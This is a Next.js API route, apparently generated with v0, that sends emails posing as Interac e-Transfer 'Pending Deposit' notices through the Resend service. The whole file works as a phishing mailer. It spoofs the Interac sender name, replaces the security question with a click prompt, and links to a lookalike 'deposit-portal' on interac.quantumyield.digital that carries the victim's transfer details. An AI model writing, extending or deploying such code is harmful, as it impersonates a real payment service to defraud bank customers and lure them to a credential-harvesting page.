import { type NextRequest, NextResponse } from "next/server"
import { generateInteracEmailHtml } from "@/lib/email-template"

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { recipient, recipientName, amount, transferId, bankName, message, timestamp } = body

    if (!recipient || !amount || !transferId) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 })
    }

    // Check for Resend API key
    const resendApiKey = process.env.RESEND_API_KEY
    if (!resendApiKey) {
      console.error("[v0] RESEND_API_KEY is not set")
      return NextResponse.json(
        { error: "Email service not configured. Please add RESEND_API_KEY to environment variables." },
        { status: 500 },
      )
    }

    const amountNumber = typeof amount === "string" ? Number.parseFloat(amount) : amount

    if (isNaN(amountNumber)) {
      return NextResponse.json({ error: "Invalid amount format" }, { status: 400 })
    }

    // Generate secure deposit URL with all required parameters
    // Using the production domain for deposit portal
    const depositBaseUrl = "https://interac.quantumyield.digital"
    const depositParams = new URLSearchParams({
      transferId,
      amount: amountNumber.toString(),
      recipient,
      recipientName: recipientName || "",
      bankName: bankName || "Banking System",
      message: message || "",
      timestamp: timestamp?.toString() || Date.now().toString(),
    })
    const depositUrl = `${depositBaseUrl}/deposit-portal?${depositParams.toString()}`

    const html = generateInteracEmailHtml({
      amount: amountNumber,
      senderName: "Interac e-Transfer",
      recipientName: recipientName || recipient,
      securityQuestion: "Pending Deposit Notification",
      securityAnswer: "Click the button below to view details",
      message: message || `Transaction ID: ${transferId}`,
      depositLink: depositUrl,
      transferId: transferId,
      institution: bankName || "Banking System",
    })

    console.log("[v0] Sending pending deposit email via Resend...")

    // Send email via Resend API
    const response = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${resendApiKey}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        from: process.env.RESEND_FROM_EMAIL || "Interac e-Transfer <onboarding@resend.dev>",
        to: [recipient],
        subject: `Pending Deposit - ${transferId}`,
        html: html,
      }),
    })

    if (!response.ok) {
      const errorData = await response.json()
      console.error("[v0] Resend error:", errorData)
      return NextResponse.json({ error: "Failed to send email", details: errorData }, { status: 500 })
    }

    const resendResult = await response.json()
    console.log("[v0] Pending deposit email sent successfully:", resendResult)

    return NextResponse.json({ success: true, message: "Pending deposit email sent successfully" })
  } catch (error) {
    console.error("[v0] Error sending pending deposit email:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}
